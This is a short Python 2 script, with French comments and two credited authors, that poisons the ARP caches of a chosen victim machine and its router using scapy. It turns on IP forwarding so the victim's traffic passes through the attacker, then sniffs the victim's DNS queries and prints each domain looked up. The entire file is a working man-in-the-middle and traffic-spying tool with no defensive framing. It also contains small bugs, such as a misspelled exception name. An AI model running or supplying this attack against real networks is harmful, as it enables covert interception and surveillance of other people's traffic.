#!/usr/bin/env python

print "###############     SCRIPT ARP PYTHON   ####################"
print "############### @Auteur - Mohamed MAIGA	 		  #"
print "############### @Auteur - NASUR MANDJOUR SAIB 		  #"
print "################### @date - 12/02/2016 #####################\n"

#Importation des modules
from scapy.all import *
import threading
import os
import sys

# Creation des varialbles
victime = raw_input('Entrez @IP du Victime: ')
routeur = raw_input('Entrez @IP du Routeur: ')
interface = raw_input('Entrez @interface: ')

 
print '\t\t\nVous etes en mode ecoute! .. '
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 

#Definition de capture 
def dnshandle(pkt):
                if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: 
                        print 'victime: ' + victime + ' has searched for: ' + pkt.getlayer(DNS).qd.qname
 
 
def v_poison():
        v = ARP(pdst=victime, psrc=routeur)
        while True:
                try:   
                       send(v,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:                     
                         sys.exit(1)
def gw_poison():
        gw = ARP(pdst=routeur, psrc=victime)
        while True:
                try:
                       send(gw,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:
                        sys.exit(1)
 
vthread = []
gwthread = []  
 
 
while True:     # Threads
               
        vpoison = threading.Thread(target=v_poison)
        vpoison.setDaemon(True)
        vthread.append(vpoison)
        vpoison.start()        
       
        gwpoison = threading.Thread(target=gw_poison)
        gwpoison.setDaemon(True)
        gwthread.append(gwpoison)
        gwpoison.start()
 
       
        pkt = sniff(iface=interface,filter='udp port 53',prn=dnshandle)